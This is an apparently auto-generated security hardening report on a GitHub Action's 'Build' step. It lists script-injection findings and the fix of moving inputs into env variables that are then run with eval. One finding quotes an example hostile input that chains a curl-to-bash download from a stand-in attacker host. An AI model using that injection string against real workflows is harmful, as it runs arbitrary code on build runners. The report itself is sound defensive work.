# Hardening Report: bitovi--github-actions-storybook-to-github-pages/v1.0.4

> This file was generated automatically by the hardening agent.

**Policy SHA:** `ff50f15e4b79bfbf764dafdfd2579175a6ea9771`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `1`

Action **bitovi--github-actions-storybook-to-github-pages/v1.0.4** was hardened automatically. 3 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### script-injection (severity: high)

The 'Build' step in action.yaml directly interpolates attacker-controlled inputs into a run: shell block. Specifically, `${{ inputs.install_command }}` and `${{ inputs.build_command }}` are expanded inline as shell commands rather than being assigned to environment variables first. A caller can supply a malicious value such as `; curl https://evil.com/exfil | bash` to execute arbitrary code on the runner. These inputs must be passed via env: variables and referenced as $ENV_VAR in the shell script.

Locations:

- `action.yaml:40`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.install_command }}" appears directly in run: block of step "Build"; move to env: map

Locations:

- `action.yml:43`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.build_command }}" appears directly in run: block of step "Build"; move to env: map

Locations:

- `action.yml:44`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, static-inline-injection

**Notes:**

Fixed shell injection in action.yaml's 'Build' step by moving `${{ inputs.install_command }}` and `${{ inputs.build_command }}` out of the run: block and into an env: block as INSTALL_COMMAND and BUILD_COMMAND respectively. The shell script now references these as plain environment variables via `eval "$INSTALL_COMMAND"` and `eval "$BUILD_COMMAND"`. Note: action.yml referenced in two findings does not exist; only action.yaml exists and has been fixed.

